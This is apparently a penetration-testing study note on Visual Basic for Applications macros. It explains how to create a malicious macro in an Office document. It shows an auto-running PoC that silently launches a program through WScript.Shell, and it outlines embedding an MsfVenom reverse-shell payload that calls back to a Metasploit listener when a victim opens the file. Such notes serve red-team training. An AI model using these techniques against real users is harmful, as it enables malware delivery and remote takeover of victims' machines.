---
creation date: May 1st 2023
last modified date: May 1st 2023
aliases: [VBA]
tags: #📕
---

Primary Categories: [[01 - Pentest]] - [[01 - Red Team]]
Secondary Categories:  [[02 - Weaponization]]
Links: [[Windows]] - [[Scripting]] - [[Microsoft Word]] - [[PowerPoint]] - [[Excel]] - [[VBScript]]
Search Tag: #📕  

# [[Visual Basic for Application]]  
___

## Description:  
Microsoft's programming language for their eco system (PowerPoint, Excel, Word, etc...). Allows for automating of nearly every keyboard and mouse interaction within their eco system apps. These are referred to as **Macros** within the apps.

One of the main functions of VBA is to access the Windows [API](https://en.wikipedia.org/wiki/Windows_API)

## Creating a Malicious Macro
1. Open Macro tool inside desired document in Windows eco system.
![[Pasted image 20230501234246.png]]
2. Enter a name for our new Macro and the hit **Create**
3. This will open VBA's IDE
4. Last note is to make sure that the file is saved in a format that has Macros enabled and has correct file extension such as `.doc`, `docm`

### Hello World!
```VBScript
Sub Document_Open()
    Hello_World
End Sub

Sub AutoOpen()
    Hello_World
End Sub

Sub Hello_World()
    MsgBox ("Hello World!")
End Sub
```

### PoC
#### Open an app
```VBScript
Sub Document_Open()
    PoC
End Sub

Sub AutoOpen()
    PoC
End Sub

Sub PoC()
    Dim payload As String
    payload = "calc.exe"
    CreateObject("WScript.Shell").Run payload, 0
End Sub
```
- Here we start by using `Document_Open()` & `AutoOpen()` to run our payload when the document with enabled macros is opened
- Breaking the PoC payload down:
	- `Dim` = We are declaring a variable of `payload` and telling it that it will be a `String`
	- `payload` = Storing the name of the app we want to spawn
	- `CreateObject()` = This tells the system to use [[Windows Scripting Host]] in a shell and run our `payload`

#### Reverse Shell
1. For this we will use [[MsfVenom]] to generate our payload:
![[MsfVenom#Reverse for VBA]]
2. Once we have this add it to the file on the victim or create a document on our machine and add it as a macro before uploading it to the victim
3. This will call back to the [[Metasploit]] Listener once opened

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: May 1st 2023 (10:05 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
